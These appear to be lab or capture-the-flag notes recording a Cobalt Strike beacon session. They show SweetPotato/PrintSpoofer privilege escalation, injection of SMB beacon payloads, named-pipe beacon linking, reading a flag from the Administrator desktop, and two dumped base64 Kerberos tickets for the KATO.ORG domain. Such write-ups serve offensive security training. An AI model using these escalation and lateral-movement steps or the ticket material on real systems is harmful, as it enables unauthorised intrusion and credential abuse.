
this showed that `execute-assembly` half worked after reboot
```powershell
[02/18 06:33:24] beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p smb2.exe
[02/18 06:33:34] [*] Tasked beacon to run .NET program: SweetPotato.exe -p smb2.exe
[02/18 06:33:44] [+] host called home, sent: 1035538 bytes
[02/18 06:33:45] [+] received output:
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch smb2.exe
```
kept trying uploading different `pipenames` and uploading in `C:\Windows\Tasks`
```powershell
[02/18 06:48:06] [*] Listing: C:\windows\tasks\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 7kb      fil     02/18/2024 04:13:19   NotPrintspoofer.exe
 6kb      fil     02/18/2024 04:52:14   NotPrintspoofer2.exe
 6b       fil     02/18/2024 06:07:12   SA.DAT
 342kb    fil     02/18/2024 06:27:19   smb.exe
 342kb    fil     02/18/2024 04:20:11   smb2.exe
 342kb    fil     02/18/2024 06:40:33   smb3.exe
 342kb    fil     02/18/2024 06:48:05   smb4.exe
```
![[Pasted image 20240218020316.png]]
# the fix was to inject into a new process and not use your initial process on the machine 
![[Pasted image 20240218020414.png]]
injected utilizing `smb2` with the pipename `TVCPIPE-pleaseimdying`
![[Pasted image 20240218020500.png]]
interacted with the new `conhost.exe` and ran sweet potato again against `smb4.exe`
```powershell
[02/18 06:50:56] beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p smb4.exe
[02/18 06:51:06] [*] Tasked beacon to run .NET program: SweetPotato.exe -p smb4.exe
[02/18 06:51:25] [+] host called home, sent: 1035538 bytes
[02/18 06:51:27] [+] received output:
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch smb4.exe
[+] Triggering notification on evil PIPE \\db/pipe/1cc9f3a4-ea05-464a-9333-ff10d58ca6e9
[+] Server connected to our evil RPC pipe

[02/18 06:51:27] [+] received output:
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program

[02/18 06:51:27] [+] received output:
[+] Process created, enjoy!
```
![[Pasted image 20240218020633.png]]
utilized the command below to show the pipe names to connect to
```powershell
[02/18 06:51:52] beacon> powershell Get-ChildItem -Path "\\.\pipe\"
[02/18 06:51:52] [*] Tasked beacon to run: Get-ChildItem -Path "\\.\pipe\"
[02/18 06:51:52] [+] host called home, sent: 147 bytes
[02/18 06:51:52] [+] received output:
#< CLIXML


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
------          1/1/1601  12:00 AM              1 Microsoft-bugsinthere1337                                            
------          1/1/1601  12:00 AM              1 TVCPIPE-pleaseimdying                                                
------          1/1/1601  12:00 AM              1 thisismy13th-reason                                                  
------          1/1/1601  12:00 AM              1 PSHost.133527127123387560.3704.DefaultAppDomain.powershell  
```
link to `thisismy13th-reason`
```powershell
[02/18 06:52:21] beacon> link localhost thisismy13th-reason
[02/18 06:52:21] [*] Tasked to link to \\localhost\pipe\thisismy13th-reason
[02/18 06:52:21] [+] host called home, sent: 45 bytes
[02/18 06:52:21] [+] established link to child beacon: 10.10.140.30
```

![[Pasted image 20240218020856.png]]
```powershell
[02/18 06:52:21] [+] established link to parent beacon: 10.10.140.30
[02/18 06:52:50] beacon> cd C:\Users\Administrator\Desktop
[02/18 06:52:50] [*] cd C:\Users\Administrator\Desktop
[02/18 06:52:50] [+] host called home, sent: 38 bytes
[02/18 06:53:01] beacon> ls
[02/18 06:53:01] [*] Tasked beacon to list files in .
[02/18 06:53:01] [+] host called home, sent: 19 bytes
[02/18 06:53:02] [*] Listing: C:\Users\Administrator\Desktop\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 282b     fil     10/06/2022 13:00:01   desktop.ini
 70b      fil     02/17/2024 22:54:35   flag5.txt

[02/18 06:53:06] beacon> type flag5.txt
[02/18 06:53:06] [-] Unknown command: type flag5.txt
[02/18 06:53:14] beacon> shell type flag5.txt
[02/18 06:53:14] [*] Tasked beacon to run: type flag5.txt
[02/18 06:53:14] [+] host called home, sent: 45 bytes
[02/18 06:53:15] [+] received output:
9ac4d80f6477e475bd3e1e4b0058e2f7
```
![[Pasted image 20240218020913.png]]


admin
```powershell
doIFkjCCBY6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQobCEtBVE8uT1JHohAwDqADAgEBoQcwBRsDREIko4IEeDCCBHSgAwIBEqEDAgEBooIEZgSCBGIS7tXTyNZwOWh1ChnATpCkM4NeXyaq17g/y91WV3q0rmV2jPuLSw+JOYVgtW9GIxaOrRkEPBiCzeeJxgVOVs4icB8Evbo9B5jrZiQxO3BMkXuyFaQ+Ijj2Bax2398UbXYD6oWzUcSChymIjKOLMEuAOlcBMcigw6gGEmYTjQaH0itY2UQoFqVuWASJnrFq22so1CxgyFvcxNaZelZWH0tLNza9nHAj8GEOfxLUA0Mfuf4oKj3uXyCM7ILnTDvDP1b0H1xE2y6ap6pfwL6kkxHv0BQbHDnePDbLb+p8h2oRZwZAcK2GMmWyBwUiktHYzcUZ/9GrXxXconQwfu3+yhjF1j4GQcf3rX6gN7113iCHA1o7FEwh6mvIYLsRuN6Azvo2ydGE2W5ToZ/UezIPjs8D+5yRpFubla2z8MCVtrZ1ytpzlwTBg8xZPqS3IYj/S74/TUCyMGmFxv3aQCaxhf8quceD/5KBqib/eCDGyZfCqQH3Myw2eJBMPYgOaZNHCZ1OIXtAmh/FapLxZrxm/NMMJomSM1YA23L07IsAiLuM6DwjPGWQwufx6+G7HJE/GDmeKCtzUS2g4ZqWjN/G0w62U1VA+wtRJcSuMs3AqrDIzIUe7Idi7KESKuuLvg6xQC5SRIUJ4DOUZkVktvmeMx4OFOv01B8hej8DG+1HGCQLAWauk/t94YUV3SPaM3XKgP20VSbKu3zeNcIEnwFSY8FHcwBnRSctNbqudBt40YQnrXcflONsjnZdJ/kbGe5umfYdx4r2tCkz7vSRM4XabWr56dpOfd2aYYoyBeDau/b9f/x38tcKL+3KlrrVLR7E0+U3PlKSZKpav2MZ2rA+3QdSs2UQRsrC8HU9d1BG9jBqkq0Q9Zu2frhWdWey9qZX+zJKxKbu1mUH9httBfBL1cKLi2ACtdURTQVQOje35+imd6S1MjdnjZeyZ3mvkIB++fjXsk00w9vumqyreIeiRTQXJ3jOsN1DQG44gITO4CSA4j8PX8yfpmdF4KSEfMUpRkVUDTehzvU79DfyxJHSppp8tipQdLbsyPrgd7HprkMSY9CtJyll9ynjbcxWsxgxVNbykHcCeVzVJDegSGwYsUHaY+BUPlzThBAVC5XfRUAb/GYnnMLp0fchF8SxYtNFQaTId4RkNYW7TL0UCDyGPT9S/mTY+saqnzCAcjHVeV8gnWe9mVlAdH+PnTJ2WODpJOthvTBVu+5hzkV8HQBxcItfadtvJpVK9S2ap6qNKB07ftgs+5urTeEAmhDUQf4l+QkE3q2hcnfTGqeI0S6V/yi+jqzohabbfGwcz9sFqFtjrTKya9zMPnx6aQdhXiZXAnWnSfRZ1D6Sur2r2LPJsuUgI9qHxOspGmC4kIM86sW4osbQlq+3ChSyZBgMYnweHf0s+P1rz8dZrB115meSqGEjfTjRmf/4ZA4fHHXeIRoATv8hzN9vyBUXEn3RFZIk7EKT8lDDY4FYJ2pUF17TBGqkFM2jgdIwgc+gAwIBAKKBxwSBxH2BwTCBvqCBuzCBuDCBtaArMCmgAwIBEqEiBCDW6dXkq5H947qJHqj6PHkaSHEIaAjmfnumHvPP1UMexaEKGwhLQVRPLk9SR6IaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNDAyMTgwNzIyMDdaphEYDzIwMjQwMjE4MTYwODE2WqcRGA8yMDI0MDIyNTA2MDgxNlqoChsIS0FUTy5PUkepEDAOoAMCAQGhBzAFGwNEQiQ=
```

cifs
```powershell
doIGHjCCBhqgAwIBBaEDAgEWooIFOTCCBTVhggUxMIIFLaADAgEFoQobCEtBVE8uT1JHoh4wHKADAgECoRUwExsEY2lmcxsLYWQua2F0by5vcmejggT4MIIE9KADAgESoQMCAQOiggTmBIIE4vEJpWOfPdalI+f/H9bVkrNa+KdwAaxIn/9q5dnvU3xRg+kdmsQEx8oiWNJPJMwrhD1NBERkV20AwPYsLt0iaFgXm74UGd3K2gL9yvI9vqmd/EyHsVxirKnYNxu4tPd9ZWREWwWXY7Dqo/w18W4uyGsjUB9xH5WJI/yPLpPFSst5u/2sbZvDm+J4/bP5ILnrWU94YgMIvcjqbxdnT7tgeIyVJ/h6fkYkZSK2eGTnB/e3fBrcR0H4POgFVFzIhBL6gb3KXSfb+4Afnpn+R+k1+biVa54RsBf9+pijX9aUBr1rGjH6aKSbxzUuV3JDGLPscRoBDDI4eJycO5rp6xh3wuaQiMZvetW5PUrMopQsgkELvVu3NUuutwdbEqnzSnc6LOhA99gvQqufR6QCvU0caaMnFrWmtrIZsYPA1tM5jp5IG11NMF5ZsJgcC+8t6jmfxfgvc7KHmphPg3L320kI78XfOX0IwmDPtcZkLDCLO+bCFAhDPKRCo1v93DSzJhKYyL5ZqmFWHnCwblBZW/3B8NakmyKbNion6nWRDTc8jnT/nNcdFP0Wn3uTJ3QpgcGm6BXKJz911MpMX8S6Eo06nJLrk9YfW7splPZ7uZeRhfk1+XxLLCj8s8xL5MQ9rz6MSD9zPgDHD42kjvL9EGSJdVgFY1Q9V+lnJJaP8YzZ7pKGLMlhDSKv+eSRFq+1iwy8qlyVSPALFq9a+gWzXcQ49nf6wsCha+fnBxf6wteDEuJEmseKF6qoSUkQaFGFVY90SyEqphHgz2eWBy+AaQRKKMPvFkgQb/3MMl90ZFVeTZCjazXIDpFu7TXBtCdPqgtZmWZrqrEfLRUlGlJSwuuj4OeClMqNjrLYo+tdKSxhwllEDzKao2B3odvo+yJHN87Z8NHKq5C3q8tCreq5jyyWEfoPm8L9LyLySq7CfXzuuaMFAfm0QeOOvBHJ7Z1QR3oGq5iRFGF395SQXKC5tlM0jBeqPC+O1721g1mkra4UFGiitPoaG43BlRSn/aX4/Aro9FLOJRp1uMlkszqFR+djILG+mvJ5N2uyEON7gACYrhjgyV1Y4iyBxSMGjFzqVHzGKUsBfLod9TlVXo7RbkhzKH58qMg6hoLLOp9Ahi4+BVoZXdNnLZzh2B+PqV36maTe1WQTo5RRJ4ZBqd6IIrC4cSWjC0BX1yKiSUxAnCCq1KHQjZ74Np90MCYwBOdtAYQRLSq8CWuxqiE98zf2Bl5ZdmtEukZOBouC6hKMcoZ0pSKEDr7N2nxhwsrdFQ3/rxGjfsNhloTfbb2pjnCIDcUjJkJxEfyQ2AGqazXUpRQiFh3VeJRnP1yE2TT2aO0s4+t11Svurq3htGbkhSlQPRAjLocwb9HeNNLl7GbcsDG0PzX1RXuCMVyRYreGlOPCMuYsImzCjokDCwqY89SlG3mqdUOacSylaTyPWbO/zMfTJBt6erhnkbF7IJOEGsxyG1MoTgF0D0UqEwqQryyhNi4vUjVnIGMn0+HDn+Gw0itxnKlHawA39vceqNXU3GMPv4QZv92iYNdwo9aIpcwG7ftFjR45+/6WYV5/DUhbtLfIc6sD5eWA2X/gA+EHjvJO4UJahlueFgsRSWyrtwLOb1AvY/i6Mz8FB1seGYjGPwjRDux0cpg+EysX6f2vKAX7M3s0EMoWo4HQMIHNoAMCAQCigcUEgcJ9gb8wgbyggbkwgbYwgbOgGzAZoAMCARGhEgQQ/fqN4jKPCQdRxwiOeeFYuaEKGwhLQVRPLk9SR6IaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyNDAyMTgwNzIyMDdaphEYDzIwMjQwMjE4MTYwODE2WqcRGA8yMDI0MDIyNTA2MDgxNlqoChsIS0FUTy5PUkepHjAcoAMCAQKhFTATGwRjaWZzGwthZC5rYXRvLm9yZw==
```